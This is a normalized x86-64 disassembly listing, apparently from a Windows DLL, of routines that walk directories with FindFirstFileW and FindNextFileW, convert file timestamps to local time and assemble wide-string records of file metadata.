mov [ rsp + 0x50 ] ax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
lea rcx [ rsp + 0x50 ]
call sub_180001ba0
nop
mov [ rbp - 0x68 ] 0x7
xor eax eax
mov [ rbp - 0x70 ] rax
mov [ rbp - 0x80 ] ax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
lea rcx [ rbp - 0x80 ]
call sub_180001ba0
lea r8 [ rbp - 0x80 ]
lea rdx [ rbp - 0x50 ]
mov rcx r15
call sub_180018a70
nop
lea rcx [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rcx
mov r9 rax
mov r8 r12
mov rdx r14
mov rcx r13
call sub_180018670
xor r12d r12d
jmp r-xdata
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r13
mov [ rbp - 0x18 ] r13w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r13
mov [ rdi ] r13w
jmp r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r13
mov [ rdi ] r13w
mov rcx [ rdi ]
call j_sub_18002094c#2
mov [ rbp ] 0x7
mov [ rbp - 0x8 ] r12
mov [ rbp - 0x18 ] r12w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18002094c#2
mov [ rsp + 0x40 ] rax
lea rcx [ r15 + 0x38 ]
lea rdx [ rsp + 0x40 ]
call sub_180001cd0
mov rcx rsi
call [ CloseHandle@IAT ]
nop
cmp [ rbp ] 0x8
jb r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r13
mov [ rdi ] r13w
jmp r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
mov eax 0x1
jmp r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov rcx [ rbp + 0x60 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x1c8 ]
add rsp 0x170
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
xor eax eax
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180019140
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor esi esi
lea rbx [ rcx + 0x10 ]
mov rdi rdx
mov [ rdx + 0x18 ] 0x7
mov [ rdx + 0x10 ] rsi
mov [ rdx ] si
mov rdx rbx
or r9 0xffffffffffffffff
xor r8d r8d
mov rcx rdi
mov [ rsp + 0x30 ] esi
call sub_180001ba0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rsi
jb r-xdata
mov [ rbx ] si
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
mov rbx [ rbx ]
sub_1800191b0
push rbp
push rbx
push rsi
push rdi
lea rbp [ rsp - 0x7f8 ]
sub rsp 0x8f8
mov [ rsp + 0x68 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x7e0 ] rax
mov [ rsp + 0x30 ] r9b
mov rax r8
mov [ rsp + 0x58 ] rax
mov rbx rdx
mov [ rsp + 0x50 ] rdx
mov rsi rcx
mov [ rsp + 0x38 ] rcx
mov [ rbp - 0x78 ] rdx
mov [ rbp - 0x80 ] rax
mov [ rbp + 0x5b8 ] 0x7
xor edi edi
mov [ rbp + 0x5b0 ] rdi
mov [ rbp + 0x5a0 ] di
mov [ rbp + 0x310 ] 0x7
mov [ rbp + 0x308 ] rdi
mov [ rbp + 0x2f8 ] di
lea ecx [ rdi + 0x30 ]
call sub_180021000
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
mov r8d 0x2e
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0x730 ]
mov rcx rdi
call sub_180017bc0
nop
mov r8d 0x30
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0x460 ]
mov rcx rdi
call sub_180017bc0
nop
mov r8d 0x30
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0x758 ]
mov rcx rdi
call sub_180017bc0
nop
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0x708 ]
mov rcx rdi
call sub_180017bc0
nop
test rdi rdi
je r-xdata
mov rcx rax
call sub_180017520
mov rdi rax
mov [ rbp + 0x798 ] 0x7
xor edi edi
mov [ rbp + 0x790 ] rdi
mov [ rbp + 0x780 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x780 ]
call sub_180003930
nop
lea r8 [ rbp + 0x780 ]
mov rdx rbx
lea rcx [ rbp + 0x7b8 ]
call sub_1800089c0
nop
mov r8 [ rsp + 0x58 ]
mov rdx rax
lea rcx [ rbp + 0x6b8 ]
call sub_180008960
nop
cmp [ rbp + 0x7d0 ] 0x8
jb r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
mov [ rbp + 0x7d0 ] 0x7
mov [ rbp + 0x7c8 ] rdi
mov [ rbp + 0x7b8 ] di
cmp [ rbp + 0x798 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x7b8 ]
call j_sub_18002094c#2
mov [ rbp + 0x798 ] 0x7
mov [ rbp + 0x790 ] rdi
mov [ rbp + 0x780 ] di
lea rcx [ rbp + 0x6b8 ]
cmp [ rbp + 0x6d0 ] 0x8
cmovae rcx [ rbp + 0x6b8 ]
lea rdx [ rbp - 0x70 ]
call [ FindFirstFileW@IAT ]
mov [ rsp + 0x60 ] rax
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx [ rbp + 0x780 ]
call j_sub_18002094c#2
call [ GetLastError@IAT ]
mov edx eax
lea rcx [ rbp + 0x438 ]
call sub_1800188b0
mov rdi rax
mov [ rbp + 0x1f8 ] 0x7
xor eax eax
mov [ rbp + 0x1f0 ] rax
mov [ rbp + 0x1e0 ] ax
lea r8d [ rax + 0x5 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1e0 ]
call sub_180003930
nop
lea r8 [ rbp + 0x1e0 ]
lea rdx [ rbp + 0x730 ]
lea rcx [ rbp + 0x3e8 ]
call sub_1800089c0
nop
lea r8 [ rbp + 0x460 ]
mov rdx rax
lea rcx [ rbp + 0x370 ]
call sub_180008960
nop
lea r8 [ rbp + 0x758 ]
mov rdx rax
lea rcx [ rbp + 0x3c0 ]
call sub_180008960
nop
lea r8 [ rbp + 0x6b8 ]
mov rdx rax
lea rcx [ rbp + 0x398 ]
call sub_180008960
nop
lea r8 [ rbp + 0x460 ]
mov rdx rax
lea rcx [ rbp + 0x320 ]
call sub_180008960
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp + 0x410 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x708 ]
mov rdx rax
lea rcx [ rbp + 0x2a8 ]
call sub_180008960
nop
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180003cb0
nop
cmp [ rbp + 0x2c0 ] 0x8
jb r-xdata
mov rdi rax
mov [ rbp + 0x2c0 ] 0x7
xor edi edi
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
cmp [ rbp + 0x428 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2a8 ]
call j_sub_18002094c#2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov [ rbp + 0x1f8 ] 0x7
xor eax eax
mov [ rbp + 0x1f0 ] rax
mov [ rbp + 0x1e0 ] ax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x44 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x44 ]
lea rcx [ rbp + 0x1e0 ]
call sub_180003930
nop
mov [ rbp + 0x298 ] 0x7
xor edi edi
mov [ rbp + 0x290 ] rdi
mov [ rbp + 0x280 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x280 ]
call sub_180003930
nop
movzx eax [ rsp + 0x7a ]
movd xmm1 eax
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x320 ]
call sub_180018950
mov [ rsp + 0x40 ] rax
mov [ rbp + 0x270 ] 0x7
mov [ rbp + 0x268 ] rdi
mov [ rbp + 0x258 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x258 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x78 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x398 ]
call sub_180018950
mov [ rsp + 0x48 ] rax
mov [ rbp + 0x248 ] 0x7
mov [ rbp + 0x240 ] rdi
mov [ rbp + 0x230 ] di
lea r8d [ rdi + 0xa ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x230 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x70 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x3c0 ]
call sub_180018950
mov rsi rax
mov [ rbp + 0x2e8 ] 0x7
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x2d0 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x72 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x370 ]
call sub_180018950
mov rbx rax
mov [ rbp + 0x360 ] 0x7
mov [ rbp + 0x358 ] rdi
mov [ rbp + 0x348 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x348 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x76 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x3e8 ]
call sub_180018950
mov rdi rax
mov edx [ rbp - 0x50 ]
lea rcx [ rbp + 0x438 ]
call sub_1800188b0
nop
mov r8 rax
lea rdx [ rbp + 0x730 ]
lea rcx [ rbp + 0x500 ]
call sub_1800089c0
nop
lea r8 [ rbp + 0x460 ]
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180008960
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp + 0x550 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x348 ]
mov rdx rax
lea rcx [ rbp + 0x578 ]
call sub_180018c70
nop
mov r8 rbx
mov rdx rax
lea rcx [ rbp + 0x5f0 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x2d0 ]
mov rdx rax
lea rcx [ rbp + 0x640 ]
call sub_180018c70
nop
mov r8 rsi
mov rdx rax
lea rcx [ rbp + 0x5c8 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x230 ]
mov rdx rax
lea rcx [ rbp + 0x668 ]
call sub_180018c70
nop
mov r8 [ rsp + 0x48 ]
mov rdx rax
lea rcx [ rbp + 0x618 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x258 ]
mov rdx rax
lea rcx [ rbp + 0x528 ]
call sub_180018c70
nop
mov r8 [ rsp + 0x40 ]
mov rdx rax
lea rcx [ rbp + 0x4b0 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x758 ]
mov rdx rax
lea rcx [ rbp + 0x690 ]
call sub_180008960
nop
mov rbx [ rsp + 0x50 ]
mov r8 rbx
mov rdx rax
lea rcx [ rbp + 0x6e0 ]
call sub_180008960
nop
lea r8 [ rbp + 0x280 ]
mov rdx rax
lea rcx [ rbp + 0x488 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x1e0 ]
mov rdx rax
lea rcx [ rbp + 0x208 ]
call sub_180018c70
mov rdi rax
lea rax [ rbp + 0x2f8 ]
cmp rax rdi
je r-xdata
mov [ rbp + 0x428 ] 0x7
mov [ rbp + 0x420 ] rdi
mov [ rbp + 0x410 ] di
cmp [ rbp + 0x338 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x410 ]
call j_sub_18002094c#2
lea rdx [ rbp - 0x70 ]
mov rcx rdi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov [ rbp + 0x220 ] 0x7
xor eax eax
mov [ rbp + 0x218 ] rax
mov [ rbp + 0x208 ] ax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x44 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x44 ]
lea rcx [ rbp + 0x208 ]
call sub_180003930
nop
mov [ rbp + 0x2e8 ] 0x7
xor edi edi
mov [ rbp + 0x2e0 ] rdi
mov [ rbp + 0x2d0 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x2d0 ]
call sub_180003930
nop
movzx eax [ rsp + 0x7a ]
movd xmm1 eax
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x2a8 ]
call sub_180018950
mov [ rsp + 0x48 ] rax
mov [ rbp + 0x248 ] 0x7
mov [ rbp + 0x240 ] rdi
mov [ rbp + 0x230 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x230 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x78 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x410 ]
call sub_180018950
mov [ rsp + 0x40 ] rax
mov [ rbp + 0x270 ] 0x7
mov [ rbp + 0x268 ] rdi
mov [ rbp + 0x258 ] di
lea r8d [ rdi + 0xa ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x258 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x70 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x348 ]
call sub_180018950
mov rsi rax
mov [ rbp + 0x298 ] 0x7
mov [ rbp + 0x290 ] rdi
mov [ rbp + 0x280 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x280 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x72 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x488 ]
call sub_180018950
mov rbx rax
mov [ rbp + 0x1f8 ] 0x7
mov [ rbp + 0x1f0 ] rdi
mov [ rbp + 0x1e0 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1e0 ]
call sub_180003930
nop
movzx ecx [ rsp + 0x76 ]
movd xmm1 ecx
cvtdq2pd xmm1 xmm1
lea rcx [ rbp + 0x6e0 ]
call sub_180018950
mov rdi rax
mov edx [ rbp - 0x50 ]
lea rcx [ rbp + 0x690 ]
call sub_1800188b0
nop
mov r8 rax
lea rdx [ rbp + 0x730 ]
lea rcx [ rbp + 0x4b0 ]
call sub_1800089c0
nop
lea r8 [ rbp + 0x460 ]
mov rdx rax
lea rcx [ rbp + 0x528 ]
call sub_180008960
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp + 0x618 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x1e0 ]
mov rdx rax
lea rcx [ rbp + 0x668 ]
call sub_180018c70
nop
mov r8 rbx
mov rdx rax
lea rcx [ rbp + 0x5c8 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x280 ]
mov rdx rax
lea rcx [ rbp + 0x640 ]
call sub_180018c70
nop
mov r8 rsi
mov rdx rax
lea rcx [ rbp + 0x5f0 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x258 ]
mov rdx rax
lea rcx [ rbp + 0x578 ]
call sub_180018c70
nop
mov r8 [ rsp + 0x40 ]
mov rdx rax
lea rcx [ rbp + 0x550 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x230 ]
mov rdx rax
lea rcx [ rbp + 0x4d8 ]
call sub_180018c70
nop
mov r8 [ rsp + 0x48 ]
mov rdx rax
lea rcx [ rbp + 0x500 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x758 ]
mov rdx rax
lea rcx [ rbp + 0x438 ]
call sub_180008960
nop
mov rbx [ rsp + 0x50 ]
mov r8 rbx
mov rdx rax
lea rcx [ rbp + 0x3e8 ]
call sub_180008960
nop
lea r8 [ rbp + 0x2d0 ]
mov rdx rax
lea rcx [ rbp + 0x370 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x208 ]
mov rdx rax
lea rcx [ rbp + 0x3c0 ]
call sub_180018c70
nop
lea r8 [ rbp + 0x460 ]
mov rdx rax
lea rcx [ rbp + 0x398 ]
call sub_180008960
nop
lea r8 [ rbp + 0x708 ]
mov rdx rax
lea rcx [ rbp + 0x320 ]
call sub_180008960
nop
mov rdx rax
lea rcx [ rbp + 0x2f8 ]
call sub_180003cb0
nop
cmp [ rbp + 0x338 ] 0x8
jb r-xdata
cmp [ rbp + 0x220 ] 0x8
jb r-xdata
cmp [ rbp + 0x310 ] 0x8
jb r-xdata
mov [ rbp + 0x338 ] 0x7
mov [ rbp + 0x330 ] rdi
mov [ rbp + 0x320 ] di
cmp [ rbp + 0x3b0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x320 ]
call j_sub_18002094c#2
lea rdx [ rbp + 0x7a8 ]
lea rcx [ rbp - 0x64 ]
call [ FileTimeToSystemTime@IAT ]
lea r8 [ rsp + 0x70 ]
lea rdx [ rbp + 0x7a8 ]
xor ecx ecx
call [ SystemTimeToTzSpecificLocalTime@IAT ]
test [ rbp - 0x70 ] 0x10
jne r-xdata
mov rcx rdi
call [ FindClose@IAT ]
xor edi edi
jmp r-xdata
mov [ rbp + 0x338 ] 0x7
xor edi edi
mov [ rbp + 0x330 ] rdi
mov [ rbp + 0x320 ] di
cmp [ rbp + 0x3b0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x320 ]
call j_sub_18002094c#2
mov [ rbp + 0x220 ] 0x7
xor edi edi
mov [ rbp + 0x218 ] rdi
mov [ rbp + 0x208 ] di
cmp [ rbp + 0x4a0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x208 ]
call j_sub_18002094c#2
mov [ rbp + 0x310 ] 0x7
xor esi esi
mov [ rbp + 0x308 ] rsi
mov [ rbp + 0x2f8 ] si
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp + 0x2f8 ]
call j_sub_18002094c#2
mov [ rbp + 0x3b0 ] 0x7
mov [ rbp + 0x3a8 ] rdi
mov [ rbp + 0x398 ] di
cmp [ rbp + 0x3d8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x398 ]
call j_sub_18002094c#2
cmp [ rsp + 0x30 ] 0x0
jne r-xdata
mov [ rbp + 0x3b0 ] 0x7
mov [ rbp + 0x3a8 ] rdi
mov [ rbp + 0x398 ] di
cmp [ rbp + 0x3d8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x398 ]
call j_sub_18002094c#2
mov [ rbp + 0x4a0 ] 0x7
mov [ rbp + 0x498 ] rdi
mov [ rbp + 0x488 ] di
cmp [ rbp + 0x6f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x488 ]
call j_sub_18002094c#2
mov rax [ rdi ]
mov [ rbp + 0x2f8 ] rax
mov [ rdi ] rsi
mov r8 [ rdi + 0x10 ]
inc r8
add r8 r8
mov rdx rdi
lea rcx [ rbp + 0x2f8 ]
call sub_1800205e0
jmp r-xdata
mov [ rbp + 0x3d8 ] 0x7
mov [ rbp + 0x3d0 ] rdi
mov [ rbp + 0x3c0 ] di
cmp [ rbp + 0x388 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3c0 ]
call j_sub_18002094c#2
mov [ rbp + 0x220 ] 0x7
mov [ rbp + 0x218 ] rdi
mov [ rbp + 0x208 ] di
mov r8d 0x2
lea rdx [ r--data ]
lea rcx [ rbp + 0x208 ]
call sub_180003930
nop
lea r8 [ rbp + 0x208 ]
mov rdx rbx
lea rcx [ rbp + 0x2a8 ]
call sub_1800089c0
nop
mov rdx rax
lea rcx [ rbp + 0x6b8 ]
call sub_180003cb0
nop
cmp [ rbp + 0x2c0 ] 0x8
jb r-xdata
cmp [ rbp + 0x6d0 ] 0x8
jb r-xdata
mov [ rbp + 0x3d8 ] 0x7
mov [ rbp + 0x3d0 ] rdi
mov [ rbp + 0x3c0 ] di
cmp [ rbp + 0x388 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3c0 ]
call j_sub_18002094c#2
mov [ rbp + 0x6f8 ] 0x7
mov [ rbp + 0x6f0 ] rdi
mov [ rbp + 0x6e0 ] di
cmp [ rbp + 0x6a8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x6e0 ]
call j_sub_18002094c#2
mov rax [ rdi + 0x10 ]
mov [ rbp + 0x308 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbp + 0x310 ] rax
mov [ rdi + 0x10 ] rsi
mov [ rdi + 0x18 ] rsi
mov [ rbp + 0x388 ] 0x7
mov [ rbp + 0x380 ] rdi
mov [ rbp + 0x370 ] di
cmp [ rbp + 0x400 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x370 ]
call j_sub_18002094c#2
mov [ rbp + 0x2c0 ] 0x7
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
cmp [ rbp + 0x220 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2a8 ]
call j_sub_18002094c#2
mov [ rbp + 0x6d0 ] 0x7
mov [ rbp + 0x6c8 ] rdi
mov [ rbp + 0x6b8 ] di
cmp [ rbp + 0x720 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x6b8 ]
call j_sub_18002094c#2
mov [ rbp + 0x388 ] 0x7
mov [ rbp + 0x380 ] rdi
mov [ rbp + 0x370 ] di
cmp [ rbp + 0x400 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x370 ]
call j_sub_18002094c#2
mov [ rbp + 0x6a8 ] 0x7
mov [ rbp + 0x6a0 ] rdi
mov [ rbp + 0x690 ] di
cmp [ rbp + 0x4c8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x690 ]
call j_sub_18002094c#2
mov [ rbp + 0x400 ] 0x7
mov [ rbp + 0x3f8 ] rdi
mov [ rbp + 0x3e8 ] di
cmp [ rbp + 0x1f8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3e8 ]
call j_sub_18002094c#2
lea rcx [ rbp + 0x6b8 ]
cmp [ rbp + 0x6d0 ] 0x8
cmovae rcx [ rbp + 0x6b8 ]
lea rdx [ rbp - 0x70 ]
call [ FindFirstFileW@IAT ]
mov rdi rax
mov [ rsp + 0x60 ] rax
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx [ rbp + 0x208 ]
call j_sub_18002094c#2
mov [ rbp + 0x720 ] 0x7
mov [ rbp + 0x718 ] rdi
mov [ rbp + 0x708 ] di
cmp [ rbp + 0x770 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x708 ]
call j_sub_18002094c#2
mov [ rbp + 0x400 ] 0x7
mov [ rbp + 0x3f8 ] rdi
mov [ rbp + 0x3e8 ] di
cmp [ rbp + 0x450 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x3e8 ]
call j_sub_18002094c#2
mov [ rbp + 0x4c8 ] 0x7
mov [ rbp + 0x4c0 ] rdi
mov [ rbp + 0x4b0 ] di
cmp [ rbp + 0x540 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4b0 ]
call j_sub_18002094c#2
mov [ rbp + 0x1f8 ] 0x7
mov [ rbp + 0x1f0 ] rdi
mov [ rbp + 0x1e0 ] di
cmp [ rbp + 0x450 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1e0 ]
call j_sub_18002094c#2
cmp [ rbp + 0x6d0 ] 0x8
jb r-xdata
nop [ rax ] eax
mov [ rbp + 0x770 ] 0x7
mov [ rbp + 0x768 ] rdi
mov [ rbp + 0x758 ] di
cmp [ rbp + 0x478 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x758 ]
call j_sub_18002094c#2
mov [ rbp + 0x450 ] 0x7
mov [ rbp + 0x448 ] rdi
mov [ rbp + 0x438 ] di
cmp [ rbp + 0x518 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x438 ]
call j_sub_18002094c#2
mov [ rbp + 0x540 ] 0x7
mov [ rbp + 0x538 ] rdi
mov [ rbp + 0x528 ] di
cmp [ rbp + 0x630 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x528 ]
call j_sub_18002094c#2
lea rcx [ rsi + 0x10 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x2f8 ]
call sub_180008240
mov rcx [ rbp + 0x438 ]
call j_sub_18002094c#2
mov [ rbp + 0x6d0 ] 0x7
xor edi edi
mov [ rbp + 0x6c8 ] rdi
mov [ rbp + 0x6b8 ] di
cmp [ rbp + 0x720 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x6b8 ]
call j_sub_18002094c#2
lea rdx [ rbp - 0x70 ]
mov rcx rdi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
cmp [ rbp - 0x44 ] 0x2e
je r-xdata
mov [ rbp + 0x478 ] 0x7
mov [ rbp + 0x470 ] rdi
mov [ rbp + 0x460 ] di
cmp [ rbp + 0x748 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x460 ]
call j_sub_18002094c#2
mov [ rbp + 0x518 ] 0x7
mov [ rbp + 0x510 ] rdi
mov [ rbp + 0x500 ] di
cmp [ rbp + 0x4f0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x500 ]
call j_sub_18002094c#2
mov [ rbp + 0x630 ] 0x7
mov [ rbp + 0x628 ] rdi
mov [ rbp + 0x618 ] di
cmp [ rbp + 0x680 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x618 ]
call j_sub_18002094c#2
mov [ rbp + 0x720 ] 0x7
mov [ rbp + 0x718 ] rdi
mov [ rbp + 0x708 ] di
cmp [ rbp + 0x770 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x708 ]
call j_sub_18002094c#2
test [ rbp - 0x70 ] 0x10
je r-xdata
mov rcx rdi
call [ FindClose@IAT ]
nop
lea rdx [ rbp + 0x7a8 ]
lea rcx [ rbp - 0x64 ]
call [ FileTimeToSystemTime@IAT ]
lea r8 [ rsp + 0x70 ]
lea rdx [ rbp + 0x7a8 ]
xor ecx ecx
call [ SystemTimeToTzSpecificLocalTime@IAT ]
mov [ rbp + 0x220 ] 0x7
xor eax eax
mov [ rbp + 0x218 ] rax
mov [ rbp + 0x208 ] ax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x44 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x44 ]
lea rcx [ rbp + 0x208 ]
call sub_180003930
nop
mov [ rbp + 0x1f8 ] 0x7
xor edi edi
mov [ rbp + 0x1f0 ] rdi
mov [ rbp + 0x1e0 ] di
lea r8d [ rdi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1e0 ]
call sub_180003930
nop
lea r8 [ rbp + 0x1e0 ]
mov rdx rbx
lea rcx [ rbp + 0x410 ]
call sub_1800089c0
nop
lea r8 [ rbp + 0x208 ]
mov rdx rax
lea rcx [ rbp + 0x2a8 ]
call sub_180018c70
nop
mov rdx rax
lea rcx [ rbp + 0x6b8 ]
call sub_180003cb0
nop
cmp [ rbp + 0x2c0 ] 0x8
jb r-xdata
mov [ rbp + 0x748 ] 0x7
mov [ rbp + 0x740 ] rdi
mov [ rbp + 0x730 ] di
cmp [ rbp + 0x310 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x730 ]
call j_sub_18002094c#2
mov [ rbp + 0x4f0 ] 0x7
mov [ rbp + 0x4e8 ] rdi
mov [ rbp + 0x4d8 ] di
cmp [ rbp + 0x568 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x4d8 ]
call j_sub_18002094c#2
mov [ rbp + 0x680 ] 0x7
mov [ rbp + 0x678 ] rdi
mov [ rbp + 0x668 ] di
cmp [ rbp + 0x5e0 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x668 ]
call j_sub_18002094c#2
mov [ rbp + 0x770 ] 0x7
mov [ rbp + 0x768 ] rdi
mov [ rbp + 0x758 ] di
cmp [ rbp + 0x478 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x758 ]
call j_sub_18002094c#2
mov [ rbp + 0x2c0 ] 0x7
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
cmp [ rbp + 0x428 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2a8 ]
call j_sub_18002094c#2
mov [ rbp + 0x310 ] 0x7
mov [ rbp + 0x308 ] rdi
mov [ rbp + 0x2f8 ] di
cmp [ rbp + 0x5b8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x2f8 ]
call j_sub_18002094c#2
mov [ rbp + 0x568 ] 0x7
mov [ rbp + 0x560 ] rdi
mov [ rbp + 0x550 ] di
cmp [ rbp + 0x590 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x550 ]
call j_sub_18002094c#2
